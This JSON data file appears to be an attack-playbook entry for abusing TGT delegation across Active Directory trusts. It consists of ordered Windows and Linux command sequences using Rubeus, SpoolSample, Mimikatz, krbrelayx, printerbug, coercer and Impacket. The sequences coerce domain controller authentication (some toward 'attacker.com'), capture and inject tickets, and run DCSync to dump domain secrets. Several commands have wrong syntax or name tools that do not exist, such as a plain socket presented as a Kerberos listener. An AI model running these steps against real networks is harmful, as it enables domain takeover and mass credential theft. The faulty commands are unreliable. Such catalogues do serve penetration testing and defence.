{
    "AbuseTGTDelegation": {
        "meaning": "The trust from the target node domain to the source node domain has TGT delegation enabled. When a resource in the source node domain is configured with unconstrained delegation, principals from the target node domain will automatically forward their Ticket Granting Ticket (TGT) to that resource upon access. This allows capturing TGTs of privileged users or computers in the target domain for privilege escalation.",
        "common": "",
        "windows": {
            "Rubeus_SpoolSample_Mimikatz": [
                {
                    "order": 1,
                    "command": "Rubeus.exe request monitor /user:targetdc.domain.local /interval:5 /nowrap",
                    "description": "Start monitoring for incoming TGTs on compromised DC with unconstrained delegation"
                },
                {
                    "order": 2,
                    "command": "SpoolSample.exe targetdc.domain.local compromiseddc.otherdomain.local",
                    "description": "Coerce target DC authentication using printer bug to capture TGT"
                },
                {
                    "order": 3,
                    "command": "Rubeus.exe ptt /ticket:doIFvjCCBbqgAwI...",
                    "description": "Inject captured DC TGT into memory for impersonation"
                },
                {
                    "order": 4,
                    "command": "lsadump::dcsync /domain:domain.local /user:DOMAIN\\Administrator",
                    "description": "Perform DCSync attack on target domain using captured TGT"
                }
            ],
            "Rubeus_PrinterBug": [
                {
                    "order": 1,
                    "command": "Rubeus.exe monitor /interval:5 /nowrap",
                    "description": "Monitor for TGTs on system with unconstrained delegation"
                },
                {
                    "order": 2,
                    "command": "# Use various coercion techniques: SpoolSample, PrinterBug, PetitPotam, etc.",
                    "description": "Coerce target authentication to capture TGT"
                },
                {
                    "order": 3,
                    "command": "Rubeus.exe ptt /ticket:<base64_ticket>",
                    "description": "Pass captured TGT for target impersonation"
                },
                {
                    "order": 4,
                    "command": "mimikatz.exe \"lsadump::dcsync /domain:target.local /all\"",
                    "description": "DCSync target domain with captured privileges"
                }
            ]
        },
        "linux": {
            "krbrelayx_printerbug": [
                {
                    "order": 1,
                    "command": "krbrelayx.py -aesKey 9ff86898afa70f5f7b9f2bf16320cb38edb2639409e1bc441ac417fac1fed5ab",
                    "description": "Start monitoring for incoming TGTs using credentials of unconstrained delegation account"
                },
                {
                    "order": 2,
                    "command": "printerbug.py '<domain>/<username>:<password>'@<target_DC_IP> <compromised_DC_IP>",
                    "description": "Coerce target DC authentication using printer bug to capture TGT"
                },
                {
                    "order": 3,
                    "command": "export KRB5CCNAME=$path_to_ticket.ccache",
                    "description": "Set environment variable to use captured TGT"
                },
                {
                    "order": 4,
                    "command": "secretsdump.py -k -just-dc-user <DOMAIN/targetuser> <target_DC_DNS_name>",
                    "description": "Perform DCSync attack on target domain using captured TGT"
                }
            ],
            "Impacket_Coercion": [
                {
                    "order": 1,
                    "command": "python3 krbrelayx.py -t ldaps://dc.target.com -u user@domain.com -p password",
                    "description": "Setup TGT relay attack on target domain controller"
                },
                {
                    "order": 2,
                    "command": "python3 printerbug.py domain.com/user:password@target.com attacker.com",
                    "description": "Trigger authentication coercion via printer spooler service"
                },
                {
                    "order": 3,
                    "command": "python3 ticketConverter.py admin.ccache admin.kirbi",
                    "description": "Convert captured ticket format for cross-platform use"
                },
                {
                    "order": 4,
                    "command": "python3 secretsdump.py -k -no-pass domain.com/admin@dc.target.com",
                    "description": "Extract domain secrets using captured administrator TGT"
                }
            ],
            "Manual_Kerberos": [
                {
                    "order": 1,
                    "command": "python3 -c \"import socket; s=socket.socket(); s.bind(('0.0.0.0', 88)); s.listen(1)\"",
                    "description": "Setup manual Kerberos listener for TGT capture"
                },
                {
                    "order": 2,
                    "command": "python3 coercer.py -t dc.target.com -l attacker.com -u user -p password",
                    "description": "Coerce authentication from target using multiple techniques"
                },
                {
                    "order": 3,
                    "command": "python3 getTGT.py -aesKey <captured_key> domain.com/admin -dc-ip dc.target.com",
                    "description": "Generate TGT using captured credentials"
                },
                {
                    "order": 4,
                    "command": "python3 dcsync.py domain.com/admin@dc.target.com -just-dc-ntlm",
                    "description": "Perform DCSync with captured administrative access"
                }
            ]
        }
    }
}
